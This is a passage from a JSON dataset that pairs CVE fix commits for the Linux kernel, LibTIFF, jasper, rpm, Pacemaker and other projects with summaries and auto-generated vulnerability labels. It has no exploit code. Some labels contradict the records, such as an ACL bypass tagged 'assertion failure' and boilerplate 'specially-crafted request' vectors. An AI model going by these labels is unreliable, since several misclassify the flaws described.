Yongjun <weiyongjun1@huawei.com>\nSigned-off-by: Linus Walleij <linus.walleij@linaro.org>","summary":"In the Linux kernel before 4.7, the amd_gpio_remove function in drivers\/pinctrl\/pinctrl-amd.c calls the pinctrl_unregister function, leading to a double free.","commit_message_1":"drop pinctrl_unregister for devm_ registered device it 's not necessary to unregister pin controller device registered with devm_pinctrl_register ( ) and using pinctrl_unregister ( ) lead to a double free","Vulnerability Type":"double free","Attack Vector":"By calling the pinctrl_unregister function","Impact":"cause a denial of service","Root Cause":"caused by a double free flaw","Attack Type":"remote attacker"},{"commit_id":"118a46090c50829dc543179019e6140e1235f909","cve_id":"CVE-2017-18120","cwe_id":"CWE-415","commit_message":"gif_read: Set last_name = NULL unconditionally.\n\nWith a non-malicious GIF, last_name is set to NULL when a name\nextension is followed by an image. Reported in #117, via\nDebian, via a KAIST fuzzing program.","summary":"A double-free bug in the read_gif function in gifread.c in gifsicle 1.90 allows a remote attacker to cause a denial-of-service attack or unspecified other impact via a maliciously crafted file, because last_name is mishandled, a different vulnerability than CVE-2017-1000421.","commit_message_1":"set last_name = null unconditionally","Vulnerability Type":"double free","Attack Vector":"via a maliciously crafted file , because last _ name is mishandled , a different vulnerability than cve - 2017 - 1000421","Impact":"cause a denial of service","Root Cause":"caused by a double-free flaw","Attack Type":"remote attacker"},{"commit_id":"340d394a789518018f834ff70f7534fc463d3226","cve_id":"CVE-2017-18079","cwe_id":"CWE-476","commit_message":"Input: i8042 - fix crash at boot time\n\nThe driver checks port->exists twice in i8042_interrupt(), first when\ntrying to assign temporary \"serio\" variable, and second time when deciding\nwhether it should call serio_interrupt(). The value of port->exists may\nchange between the 2 checks, and we may end up calling serio_interrupt()\nwith a NULL pointer:\n\nBUG: unable to handle kernel NULL pointer dereference at 0000000000000050\nIP: [<ffffffff8150feaf>] _spin_lock_irqsave+0x1f\/0x40\nPGD 0\nOops: 0002 [#1] SMP\nlast sysfs file:\nCPU 0\nModules linked in:\n\nPid: 1, comm: swapper Not tainted 2.6.32-358.el6.x86_64 #1 QEMU Standard PC (i440FX + PIIX, 1996)\nRIP: 0010:[<ffffffff8150feaf>]  [<ffffffff8150feaf>] _spin_lock_irqsave+0x1f\/0x40\nRSP: 0018:ffff880028203cc0  EFLAGS: 00010082\nRAX: 0000000000010000 RBX: 0000000000000000 RCX: 0000000000000000\nRDX: 0000000000000282 RSI: 0000000000000098 RDI: 0000000000000050\nRBP: ffff880028203cc0 R08: ffff88013e79c000 R09: ffff880028203ee0\nR10: 0000000000000298 R11: 0000000000000282 R12: 0000000000000050\nR13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000098\nFS:  0000000000000000(0000) GS:ffff880028200000(0000) knlGS:0000000000000000\nCS:  0010 DS: 0018 ES: 0018 CR0: 000000008005003b\nCR2: 0000000000000050 CR3: 0000000001a85000 CR4: 00000000001407f0\nDR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000\nDR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400\nProcess swapper (pid: 1, threadinfo ffff88013e79c000, task ffff88013e79b500)\nStack:\nffff880028203d00 ffffffff813de186 ffffffffffffff02 0000000000000000\n<d> 0000000000000000 0000000000000000 0000000000000000 0000000000000098\n<d> ffff880028203d70 ffffffff813e0162 ffff880028203d20 ffffffff8103b8ac\nCall Trace:\n<IRQ>\n [<ffffffff813de186>] serio_interrupt+0x36\/0xa0\n[<ffffffff813e0162>] i8042_interrupt+0x132\/0x3a0\n[<ffffffff8103b8ac>] ? kvm_clock_read+0x1c\/0x20\n[<ffffffff8103b8b9>] ? kvm_clock_get_cycles+0x9\/0x10\n[<ffffffff810e1640>] handle_IRQ_event+0x60\/0x170\n[<ffffffff8103b154>] ? kvm_guest_apic_eoi_write+0x44\/0x50\n[<ffffffff810e3d8e>] handle_edge_irq+0xde\/0x180\n[<ffffffff8100de89>] handle_irq+0x49\/0xa0\n[<ffffffff81516c8c>] do_IRQ+0x6c\/0xf0\n[<ffffffff8100b9d3>] ret_from_intr+0x0\/0x11\n[<ffffffff81076f63>] ? __do_softirq+0x73\/0x1e0\n[<ffffffff8109b75b>] ? hrtimer_interrupt+0x14b\/0x260\n[<ffffffff8100c1cc>] ? call_softirq+0x1c\/0x30\n[<ffffffff8100de05>] ? do_softirq+0x65\/0xa0\n[<ffffffff81076d95>] ? irq_exit+0x85\/0x90\n[<ffffffff81516d80>] ? smp_apic_timer_interrupt+0x70\/0x9b\n[<ffffffff8100bb93>] ? apic_timer_interrupt+0x13\/0x20\n\nTo avoid the issue let's change the second check to test whether serio is\nNULL or not.\n\nAlso, let's take i8042_lock in i8042_start() and i8042_stop() instead of\ntrying to be overly smart and using memory barriers.\n\nSigned-off-by: Chen Hong <chenhong3@huawei.com>\n[dtor: take lock in i8042_start()\/i8042_stop()]\nCc: stable@vger.kernel.org\nSigned-off-by: Dmitry Torokhov <dmitry.torokhov@gmail.com>","summary":"drivers\/input\/serio\/i8042.c in the Linux kernel before 4.12.4 allows attackers to cause a denial of service (NULL pointer dereference and system crash) or possibly have unspecified other impact because the port->exists value can change after it is validated.","commit_message_1":"i8042 - fix crash at boot time the driver check port- > exists twice in i8042_interrupt ( ) , first when trying to assign temporary `` serio '' variable , and second time when deciding whether it should call serio_interrupt ( )","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"drivers\/input\/serio\/i8042.c in the Linux kernel","Impact":"cause a denial of service ( pointer dereference and system crash ) or possibly have unspecified other impact because the port - > exists value can change after it is validated .","Root Cause":"caused by a NULL pointer dereference","Attack Type":"local attacker"},{"commit_id":"d76c68109f37cb85b243a1cf0f40313afd2bae68","cve_id":"CVE-2017-18075","cwe_id":"CWE-763","commit_message":"crypto: pcrypt - fix freeing pcrypt instances\n\npcrypt is using the old way of freeing instances, where the ->free()\nmethod specified in the 'struct crypto_template' is passed a pointer to\nthe 'struct crypto_instance'.  But the crypto_instance is being\nkfree()'d directly, which is incorrect because the memory was actually\nallocated as an aead_instance, which contains the crypto_instance at a\nnonzero offset.  Thus, the wrong pointer was being kfree()'d.\n\nFix it by switching to the new way to free aead_instance's where the\n->free() method is specified in the aead_instance itself.\n\nReported-by: syzbot <syzkaller@googlegroups.com>\nFixes: 0496f56065e0 (\"crypto: pcrypt - Add support for new AEAD interface\")\nCc: <stable@vger.kernel.org> # v4.2+\nSigned-off-by: Eric Biggers <ebiggers@google.com>\nSigned-off-by: Herbert Xu <herbert@gondor.apana.org.au>","summary":"crypto\/pcrypt.c in the Linux kernel before 4.14.13 mishandles freeing instances, allowing a local user able to access the AF_ALG-based AEAD interface (CONFIG_CRYPTO_USER_API_AEAD) and pcrypt (CONFIG_CRYPTO_PCRYPT) to cause a denial of service (kfree of an incorrect pointer) or possibly have unspecified other impact by executing a crafted sequence of system calls.","commit_message_1":"pcrypt - fix freeing pcrypt instance pcrypt is using the old way of freeing instance , where the - > free ( ) method specified in the 'struct crypto_template ' is passed a pointer to the 'struct crypto_instance '","Vulnerability Type":"Release of Invalid Pointer or Reference","Attack Vector":"by executing a specially-crafted sequence of system calls","Impact":"cause a denial of service","Root Cause":"caused by a mishandling of freeing instances by crypto\/pcrypt.c","Attack Type":"local attacker"},{"commit_id":"2638fd0f92d4397884fd991d8f4925cb3f081901","cve_id":"CVE-2017-18017","cwe_id":"CWE-416","commit_message":"netfilter: xt_TCPMSS: add more sanity tests on tcph->doff\n\nDenys provided an awesome KASAN report pointing to an use\nafter free in xt_TCPMSS\n\nI have provided three patches to fix this issue, either in xt_TCPMSS or\nin xt_tcpudp.c. It seems xt_TCPMSS patch has the smallest possible\nimpact.\n\nSigned-off-by: Eric Dumazet <edumazet@google.com>\nReported-by: Denys Fedoryshchenko <nuclearcat@nuclearcat.com>\nSigned-off-by: Pablo Neira Ayuso <pablo@netfilter.org>","summary":"The tcpmss_mangle_packet function in net\/netfilter\/xt_TCPMSS.c in the Linux kernel before 4.11, and 4.9.x before 4.9.36, allows remote attackers to cause a denial of service (use-after-free and memory corruption) or possibly have unspecified other impact by leveraging the presence of xt_TCPMSS in an iptables action.","commit_message_1":"xt_tcpmss : add more sanity test on tcph- > doff denys provided an awesome kasan report pointing to an use after free in xt_tcpmss i have provided three patch to fix this issue , either in xt_tcpmss or in <file>","Vulnerability Type":"Use After Free","Attack Vector":"by leveraging the presence of xt _ tcpmss in an iptables action","Impact":"cause a denial of service ( use - after - free and memory corruption ) or possibly have unspecified other impact","Root Cause":"caused by a use-after-free flaw","Attack Type":"remote attacker"},{"commit_id":"f1394822a0152ceed77815eafa5cac4e8baab10a","cve_id":"CVE-2017-16909","cwe_id":"CWE-119","commit_message":"SECUNIA advisory 76000 #1 (wrong fuji width set via tiff tag","summary":"An error related to the *LibRaw::panasonic_load_raw()* function (dcraw_common.cpp) in LibRaw versions prior to 0.18.6 can be exploited to cause a heap-based buffer overflow and subsequently cause a crash via a specially crafted TIFF image.","commit_message_1":"secunia advisory <number> # <number> ( wrong fuji width set via tiff tag","Vulnerability Type":"buffer overflow","Attack Vector":"via a specially crafted tiff image","Impact":"cause a denial of service","Root Cause":"caused by a heap-based buffer overflow","Attack Type":"remote attacker"},{"commit_id":"0b5a5258abbeaf8a0c3a18c7e753699787fdf46e","cve_id":"CVE-2017-15365","cwe_id":null,"commit_message":"MW-416 DDL replication moved after acl checking\n\ngalera_events test shows a regression with the original fix for MW-416\nReason was that Events::drop_event() can be called also from inside event\nexecution, and there we have a speacial treatment for event, which executes\n\"DROP EVENT\" statement, and runs TOI replication inside the event processing body.\nThis resulted in executing WSREP_TO_ISOLATION two times for such DROP EVENT statement.\nFix is to call WSREP_TO_ISOLATION_BEGIN only in Events::drop_event()","summary":"sql\/event_data_objects.cc in MariaDB before 10.1.30 and 10.2.x before 10.2.10 and Percona XtraDB Cluster before 5.6.37-26.21-3 and 5.7.x before 5.7.19-29.22-3 allows remote authenticated users with SQL access to bypass intended access restrictions and replicate data definition language (DDL) statements to cluster nodes by leveraging incorrect ordering of DDL replication and ACL checking.","commit_message_1":"mw-<number> ddl replication moved after acl checking galera_events test show a regression with the original fix for mw-<number> reason wa that event : :drop_event ( ) can be called also from inside event execution , and there we have a speacial treatment for event , which executes '' drop event '' statement , and run toi replication inside the event processing body","Vulnerability Type":"assertion failure","Attack Vector":"by leveraging incorrect ordering of ddl replication and acl checking","Impact":"bypass intended access restrictions and replicate data definition language ( ddl ) statements to cluster nodes","Root Cause":"with SQL access","Attack Type":"remote attacker"},{"commit_id":"21b5944350052d2583e82dd59b19a9ba94a007f0","cve_id":"CVE-2017-15129","cwe_id":"CWE-416","commit_message":"net: Fix double free and memory corruption in get_net_ns_by_id()\n\n(I can trivially verify that that idr_remove in cleanup_net happens\n after the network namespace count has dropped to zero --EWB)\n\nFunction get_net_ns_by_id() does not check for net::count\nafter it has found a peer in netns_ids idr.\n\nIt may dereference a peer, after its count has already been\nfinaly decremented. This leads to double free and memory\ncorruption:\n\nput_net(peer)                                   rtnl_lock()\natomic_dec_and_test(&peer->count) [count=0]     ...\n__put_net(peer)                                 get_net_ns_by_id(net, id)\n  spin_lock(&cleanup_list_lock)\n  list_add(&net->cleanup_list, &cleanup_list)\n  spin_unlock(&cleanup_list_lock)\nqueue_work()                                      peer = idr_find(&net->netns_ids, id)\n  |                                               get_net(peer) [count=1]\n  |                                               ...\n  |                                               (use after final put)\n  v                                               ...\n  cleanup_net()                                   ...\n    spin_lock(&cleanup_list_lock)                 ...\n    list_replace_init(&cleanup_list, ..)          ...\n    spin_unlock(&cleanup_list_lock)               ...\n    ...                                           ...\n    ...                                           put_net(peer)\n    ...                                             atomic_dec_and_test(&peer->count) [count=0]\n    ...                                               spin_lock(&cleanup_list_lock)\n    ...                                               list_add(&net->cleanup_list, &cleanup_list)\n    ...                                               spin_unlock(&cleanup_list_lock)\n    ...                                             queue_work()\n    ...                                           rtnl_unlock()\n    rtnl_lock()                                   ...\n    for_each_net(tmp) {                           ...\n      id = __peernet2id(tmp, peer)                ...\n      spin_lock_irq(&tmp->nsid_lock)              ...\n      idr_remove(&tmp->netns_ids, id)             ...\n      ...                                         ...\n      net_drop_ns()                               ...\n\tnet_free(peer)                            ...\n    }                                             ...\n  |\n  v\n  cleanup_net()\n    ...\n    (Second free of peer)\n\nAlso, put_net() on the right cpu may reorder with left's cpu\nlist_replace_init(&cleanup_list, ..), and then cleanup_list\nwill be corrupted.\n\nSince cleanup_net() is executed in worker thread, while\nput_net(peer) can happen everywhere, there should be\nenough time for concurrent get_net_ns_by_id() to pick\nthe peer up, and the race does not seem to be unlikely.\nThe patch fixes the problem in standard way.\n\n(Also, there is possible problem in peernet2id_alloc(), which requires\ncheck for net::count under nsid_lock and maybe_get_net(peer), but\nin current stable kernel it's used under rtnl_lock() and it has to be\nsafe. Openswitch begun to use peernet2id_alloc(), and possibly it should\nbe fixed too. While this is not in stable kernel yet, so I'll send\na separate message to netdev@ later).\n\nCc: Nicolas Dichtel <nicolas.dichtel@6wind.com>\nSigned-off-by: Kirill Tkhai <ktkhai@virtuozzo.com>\nFixes: 0c7aecd4bde4 \"netns: add rtnl cmd to add and get peer netns ids\"\nReviewed-by: Andrey Ryabinin <aryabinin@virtuozzo.com>\nReviewed-by: \"Eric W. Biederman\" <ebiederm@xmission.com>\nSigned-off-by: Eric W. Biederman <ebiederm@xmission.com>\nReviewed-by: Eric Dumazet <edumazet@google.com>\nAcked-by: Nicolas Dichtel <nicolas.dichtel@6wind.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"A use-after-free vulnerability was found in network namespaces code affecting the Linux kernel before 4.14.11. The function get_net_ns_by_id() in net\/core\/net_namespace.c does not check for the net::count value after it has found a peer network in netns_ids idr, which could lead to double free and memory corruption. This vulnerability could allow an unprivileged local user to induce kernel memory corruption on the system, leading to a crash. Due to the nature of the flaw, privilege escalation cannot be fully ruled out, although it is thought to be unlikely.","commit_message_1":"fix double free and memory corruption in get_net_ns_by_id ( ) ( i can trivially verify that that idr_remove in cleanup_net happens after the network namespace count ha dropped to zero -- ewb ) function get_net_ns_by_id ( ) doe not check for net : :count after it ha found a peer in netns_ids idr","Vulnerability Type":"Use After Free","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service","Root Cause":"does not check for the net : : count value after it has found a peer network","Attack Type":"local attacker"},{"commit_id":"1e3921471354244f70fe268586ff94a97a6dd4df","cve_id":"CVE-2017-15128","cwe_id":"CWE-119","commit_message":"userfaultfd: hugetlbfs: prevent UFFDIO_COPY to fill beyond the end of i_size\n\nThis oops:\n\n  kernel BUG at fs\/hugetlbfs\/inode.c:484!\n  RIP: remove_inode_hugepages+0x3d0\/0x410\n  Call Trace:\n    hugetlbfs_setattr+0xd9\/0x130\n    notify_change+0x292\/0x410\n    do_truncate+0x65\/0xa0\n    do_sys_ftruncate.constprop.3+0x11a\/0x180\n    SyS_ftruncate+0xe\/0x10\n    tracesys+0xd9\/0xde\n\nwas caused by the lack of i_size check in hugetlb_mcopy_atomic_pte.\n\nmmap() can still succeed beyond the end of the i_size after vmtruncate\nzapped vmas in those ranges, but the faults must not succeed, and that\nincludes UFFDIO_COPY.\n\nWe could differentiate the retval to userland to represent a SIGBUS like\na page fault would do (vs SIGSEGV), but it doesn't seem very useful and\nwe'd need to pick a random retval as there's no meaningful syscall\nretval that would differentiate from SIGSEGV and SIGBUS, there's just\n-EFAULT.\n\nLink: http:\/\/lkml.kernel.org\/r\/20171016223914.2421-2-aarcange@redhat.com\nSigned-off-by: Andrea Arcangeli <aarcange@redhat.com>\nReviewed-by: Mike Kravetz <mike.kravetz@oracle.com>\nCc: Mike Rapoport <rppt@linux.vnet.ibm.com>\nCc: \"Dr. David Alan Gilbert\" <dgilbert@redhat.com>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"A flaw was found in the hugetlb_mcopy_atomic_pte function in mm\/hugetlb.c in the Linux kernel before 4.13.12. A lack of size check could cause a denial of service (BUG).","commit_message_1":"hugetlbfs : prevent uffdio_copy to fill beyond the end of i_size this oops : kernel bug at fs\/hugetlbfs\/<file> : <number> ! rip : remove_inode_hugepages+0x3d0\/0x410 call trace : hugetlbfs_setattr+0xd9\/0x130 notify_change+0x292\/0x410 do_truncate+0x65\/0xa0 <file>","Vulnerability Type":"buffer overflow","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"5af10dfd0afc559bb4b0f7e3e8227a1578333995","cve_id":"CVE-2017-15127","cwe_id":null,"commit_message":"userfaultfd: hugetlbfs: remove superfluous page unlock in VM_SHARED case\n\nhuge_add_to_page_cache->add_to_page_cache implicitly unlocks the page\nbefore returning in case of errors.\n\nThe error returned was -EEXIST by running UFFDIO_COPY on a non-hole\noffset of a VM_SHARED hugetlbfs mapping.  It was an userland bug that\ntriggered it and the kernel must cope with it returning -EEXIST from\nioctl(UFFDIO_COPY) as expected.\n\n  page dumped because: VM_BUG_ON_PAGE(!PageLocked(page))\n  kernel BUG at mm\/filemap.c:964!\n  invalid opcode: 0000 [#1] SMP\n  CPU: 1 PID: 22582 Comm: qemu-system-x86 Not tainted 4.11.11-300.fc26.x86_64 #1\n  RIP: unlock_page+0x4a\/0x50\n  Call Trace:\n    hugetlb_mcopy_atomic_pte+0xc0\/0x320\n    mcopy_atomic+0x96f\/0xbe0\n    userfaultfd_ioctl+0x218\/0xe90\n    do_vfs_ioctl+0xa5\/0x600\n    SyS_ioctl+0x79\/0x90\n    entry_SYSCALL_64_fastpath+0x1a\/0xa9\n\nLink: http:\/\/lkml.kernel.org\/r\/20170802165145.22628-2-aarcange@redhat.com\nSigned-off-by: Andrea Arcangeli <aarcange@redhat.com>\nTested-by: Maxime Coquelin <maxime.coquelin@redhat.com>\nReviewed-by: Mike Kravetz <mike.kravetz@oracle.com>\nCc: \"Dr. David Alan Gilbert\" <dgilbert@redhat.com>\nCc: Mike Rapoport <rppt@linux.vnet.ibm.com>\nCc: Alexey Perevalov <a.perevalov@samsung.com>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"A flaw was found in the hugetlb_mcopy_atomic_pte function in mm\/hugetlb.c in the Linux kernel before 4.13. A superfluous implicit page unlock for VM_SHARED hugetlbfs mapping could trigger a local denial of service (BUG).","commit_message_1":"hugetlbfs : remove superfluous page unlock in vm_shared case huge_add_to_page_cache- > add_to_page_cache implicitly unlocks the page before returning in case of error","Vulnerability Type":"BUG","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"384632e67e0829deb8015ee6ad916b180049d252","cve_id":"CVE-2017-15126","cwe_id":"CWE-416","commit_message":"userfaultfd: non-cooperative: fix fork use after free\n\nWhen reading the event from the uffd, we put it on a temporary\nfork_event list to detect if we can still access it after releasing and\nretaking the event_wqh.lock.\n\nIf fork aborts and removes the event from the fork_event all is fine as\nlong as we're still in the userfault read context and fork_event head is\nstill alive.\n\nWe've to put the event allocated in the fork kernel stack, back from\nfork_event list-head to the event_wqh head, before returning from\nuserfaultfd_ctx_read, because the fork_event head lifetime is limited to\nthe userfaultfd_ctx_read stack lifetime.\n\nForgetting to move the event back to its event_wqh place then results in\n__remove_wait_queue(&ctx->event_wqh, &ewq->wq); in\nuserfaultfd_event_wait_completion to remove it from a head that has been\nalready freed from the reader stack.\n\nThis could only happen if resolve_userfault_fork failed (for example if\nthere are no file descriptors available to allocate the fork uffd).  If\nit succeeded it was put back correctly.\n\nFurthermore, after find_userfault_evt receives a fork event, the forked\nuserfault context in fork_nctx and uwq->msg.arg.reserved.reserved1 can\nbe released by the fork thread as soon as the event_wqh.lock is\nreleased.  Taking a reference on the fork_nctx before dropping the lock\nprevents an use after free in resolve_userfault_fork().\n\nIf the fork side aborted and it already released everything, we still\ntry to succeed resolve_userfault_fork(), if possible.\n\nFixes: 893e26e61d04eac9 (\"userfaultfd: non-cooperative: Add fork() event\")\nLink: http:\/\/lkml.kernel.org\/r\/20170920180413.26713-1-aarcange@redhat.com\nSigned-off-by: Andrea Arcangeli <aarcange@redhat.com>\nReported-by: Mark Rutland <mark.rutland@arm.com>\nTested-by: Mark Rutland <mark.rutland@arm.com>\nCc: Pavel Emelyanov <xemul@virtuozzo.com>\nCc: Mike Rapoport <rppt@linux.vnet.ibm.com>\nCc: \"Dr. David Alan Gilbert\" <dgilbert@redhat.com>\nCc: Mike Kravetz <mike.kravetz@oracle.com>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"A use-after-free flaw was found in fs\/userfaultfd.c in the Linux kernel before 4.13.6. The issue is related to the handling of fork failure when dealing with event messages. Failure to fork correctly can lead to a situation where a fork event will be removed from an already freed list of events with userfaultfd_ctx_put().","commit_message_1":"non-cooperative : fix fork use after free when reading the event from the uffd , we put it on a temporary fork_event list to detect if we can still access it after releasing and retaking the <file>","Vulnerability Type":"Use After Free","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service","Root Cause":"caused by a use-after-free flaw","Attack Type":"remote attacker"},{"commit_id":"f237f3e09ecbaf59c897f5046538a7b1a3fa40c1","cve_id":"CVE-2017-9732","cwe_id":"CWE-400","commit_message":"knc: fix a couple of memory leaks.\n\nOne of these can be remotely triggered during the authentication\nphase which leads to a remote DoS possibility.\n\nPointed out by: Imre Rad <radimre83@gmail.com>","summary":"The read_packet function in knc (Kerberised NetCat) before 1.11-1 is vulnerable to denial of service (memory exhaustion) that can be exploited remotely without authentication, possibly affecting another services running on the targeted host.","commit_message_1":"fix a couple of memory leak","Vulnerability Type":"Uncontrolled Resource Consumption","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service","Root Cause":"caused by a memory leak","Attack Type":"remote attacker"},{"commit_id":"c815822c8bdb138066ff58c624ae83e3a12ebfa9","cve_id":"CVE-2017-7500","cwe_id":"CWE-59","commit_message":"Make verification match the new restricted directory symlink behavior\n\nOnly follow directory symlinks owned by target directory owner or root\nduring verification to match the behavior of fsmVerify() in the new\nCVE-2017-7500 world order.\n\nThe code is klunkier than it should and the logic should use common code\nwith fsmVerify() instead of duplicating it here, but that needs more\nchanges than is comfortable to backport so starting with this.\n\nAlso worth noting that the previous \"follow the link\" logic from\ncommit 3ccd774255b8215733e0bdfdf5a683da9dd10923 was not quite right,\nit'd fail with RPMVERIFY_LSTATFAIL on a broken symlink when it should've\nran verification on the symlink itself. This behavior is fixed here too.\n\nFinally, once again fakechroot gets in the way and forces the related\nverify testcase to be changed to be able to create a valid link. Reuse\nthe replacement testcase for the purpose and add another case for\nverifying an invalid link.","summary":"It was found that rpm did not properly handle RPM installations when a destination path was a symbolic link to a directory, possibly changing ownership and permissions of an arbitrary directory, and RPM files being placed in an arbitrary destination. An attacker, with write access to a directory in which a subdirectory will be installed, could redirect that directory to an arbitrary location and gain root privilege.","commit_message_1":"make verification match the new restricted directory symlink behavior only follow directory symlinks owned by target directory owner or root during verification to match the behavior of fsmverify ( ) in the new <cve_id> world order","Vulnerability Type":"Link Following","Attack Vector":"by creating a symbolic link from a temporary file to directories","Impact":"gain root privileges","Root Cause":"caused by the improper handling of RPM installations when a destination path was a symbolic link to a directory","Attack Type":"local attacker"},{"commit_id":"dffab154d29a288aa171ff50263ecc8f2e14a891","cve_id":"CVE-2017-2616","cwe_id":"CWE-362","commit_message":"su: properly clear child PID\n\nReported-by: Tobias St\u00f6ckmann <tobias@stoeckmann.org>\nSigned-off-by: Karel Zak <kzak@redhat.com>","summary":"A race condition was found in util-linux before 2.32.1 in the way su handled the management of child processes. A local authenticated attacker could use this flaw to kill other processes with root privileges under specific conditions.","commit_message_1":"su : properly clear child pid","Vulnerability Type":"Race Condition","Attack Vector":"handling the management of child processes","Impact":"bypass security restrictions","Root Cause":"caused by a race condition when handling the management of child processes","Attack Type":"local attacker"},{"commit_id":"37deefd01f0875e133ea967122e3a5e421b8fcd9","cve_id":"CVE-2016-10544","cwe_id":"CWE-20","commit_message":"Don't inflate more than ~16mb, drop connection on inflate error","summary":"uws is a WebSocket server library. By sending a 256mb websocket message to a uws server instance with permessage-deflate enabled, there is a possibility used compression will shrink said 256mb down to less than 16mb of websocket payload which passes the length check of 16mb payload. This data will then inflate up to 256mb and crash the node process by exceeding V8's maximum string size. This affects uws >=0.10.0 <=0.10.8.","commit_message_1":"do n't inflate more than ~16mb , drop connection on inflate error","Vulnerability Type":"Improper Input Validation","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service","Root Cause":"caused by improper validation of large websocket messages","Attack Type":"remote attacker"},{"commit_id":"aa0b0f79ade5eef8b0e7a214c03f5af54b36ba7d","cve_id":"CVE-2016-9583","cwe_id":"CWE-125","commit_message":"Fixed numerous integer overflow problems in the code for packet iterators\nin the JPC decoder.","summary":"An out-of-bounds heap read vulnerability was found in the jpc_pi_nextpcrl() function of jasper before 2.0.6 when processing crafted input.","commit_message_1":"fixed numerous integer overflow problem in the code for packet iterators in the jpc decoder","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By persuading a victim to open a specially-crafted image file","Impact":"cause a denial of service","Root Cause":"caused by an out-of-bounds heap read","Attack Type":"remote attacker"},{"commit_id":"4a59cfaf9ab3d48fca4a15c0d2674bf7138e3d1a","cve_id":"CVE-2016-8654","cwe_id":"CWE-119","commit_message":"Fixed a buffer overrun problem in the QMFB code in the JPC codec\nthat was caused by a buffer being allocated with a size that was too small\nin some cases.\nAdded a new regression test case.","summary":"A heap-buffer overflow vulnerability was found in QMFB code in JPC codec caused by buffer being allocated with too small size. jasper versions before 2.0.0 are affected.","commit_message_1":"fixed a buffer overrun problem in the qmfb code in the jpc codec that wa caused by a buffer being allocated with a size that wa too small in some case","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to open a specially-crafted image file","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"caused by improper bounds checking by the QMFB code","Attack Type":"remote attacker"},{"commit_id":"5d71e65049","cve_id":"CVE-2016-7035","cwe_id":"CWE-285","commit_message":"High: libcrmcommon: fix CVE-2016-7035 (improper IPC guarding)\n\nIt was discovered that at some not so uncommon circumstances, some\npacemaker daemons could be talked to, via libqb-facilitated IPC, by\nunprivileged clients due to flawed authorization decision.  Depending\non the capabilities of affected daemons, this might equip unauthorized\nuser with local privilege escalation or up to cluster-wide remote\nexecution of possibly arbitrary commands when such user happens to\nreside at standard or remote\/guest cluster node, respectively.\n\nThe original vulnerability was introduced in an attempt to allow\nunprivileged IPC clients to clean up the file system materialized\nleftovers in case the server (otherwise responsible for the lifecycle\nof these files) crashes.  While the intended part of such behavior is\nnow effectively voided (along with the unintended one), a best-effort\nfix to address this corner case systemically at libqb is coming along\n(https:\/\/github.com\/ClusterLabs\/libqb\/pull\/231).\n\nAffected versions:  1.1.10-rc1 (2013-04-17) - 1.1.15 (2016-06-21)\nImpact:             Important\nCVSSv3 ranking:     8.8 : AV:L\/AC:L\/PR:L\/UI:N\/S:C\/C:H\/I:H\/A:H\n\nCredits for independent findings, in chronological order:\n  Jan \"poki\" Pokorn\u00fd, of Red Hat\n  Alain Moulle, of ATOS\/BULL","summary":"An authorization flaw was found in Pacemaker before 1.1.16, where it did not properly guard its IPC interface. An attacker with an unprivileged account on a Pacemaker node could use this flaw to, for example, force the Local Resource Manager daemon to execute a script as root and thereby gain root access on the machine.","commit_message_1":"libcrmcommon : fix <cve_id> ( improper ipc guarding ) it wa discovered that at some not so uncommon circumstance , some pacemaker daemon could be talked to , via libqb-facilitated ipc , by unprivileged client due to flawed authorization decision","Vulnerability Type":"Improper Authorization","Attack Vector":"force the Local Resource Manager daemon","Impact":"execute a script as root and thereby gain root access on the machine","Root Cause":"caused by improper guarding of IPC communication","Attack Type":"remote attacker"},{"commit_id":"391e77fcd217e78b2c51342ac3ddb7100ecacdd2","cve_id":"CVE-2016-5314","cwe_id":"CWE-787","commit_message":"* libtiff\/tif_pixarlog.c: fix potential buffer write overrun in\nPixarLogDecode() on corrupted\/unexpected images (reported by Mathias Svensson)","summary":"Buffer overflow in the PixarLogDecode function in tif_pixarlog.c in LibTIFF 4.0.6 and earlier allows remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact via a crafted TIFF image, as demonstrated by overwriting the vgetparent function pointer with rgb2ycbcr.","commit_message_1":"fix potential buffer write overrun in pixarlogdecode ( ) on corrupted\/unexpected image ( reported by mathias svensson )","Vulnerability Type":"Buffer overflow","Attack Vector":"via a crafted tiff image , as demonstrated by overwriting the vgetparent function pointer with rgb2ycbcr","Impact":"cause a denial of service ( application crash ) or possibly have unspecified other impact","Root Cause":"caused by an out-of-bounds write","Attack Type":"remote attacker"},{"commit_id":"69dee5c732fe982c82edb17d0dbc3e79a47748d8","cve_id":"CVE-2015-9253","cwe_id":"CWE-400","commit_message":"Fixed bug #73342\n\nDirectly listen on socket, instead of duping it to STDIN and\nlistening on that.","summary":"An issue was discovered in PHP 7.3.x before 7.3.0alpha3, 7.2.x before 7.2.8, and before 7.1.20. The php-fpm master process restarts a child process in an endless loop when using program execution functions (e.g., passthru, exec, shell_exec, or system) with a non-blocking STDIN stream, causing this master process to consume 100% of the CPU, and consume disk space with a large volume of error logs, as demonstrated by an attack by a customer of a shared-hosting facility.","commit_message_1":"fixed bug # <number> directly listen on socket , instead of duping it to stdin and listening on that","Vulnerability Type":"Uncontrolled Resource Consumption","Attack Vector":"The php-fpm master process restarts a child process in an endless loop when using program execution functions (e.g., passthru, exec, shell_exec, or system) with a non-blocking STDIN 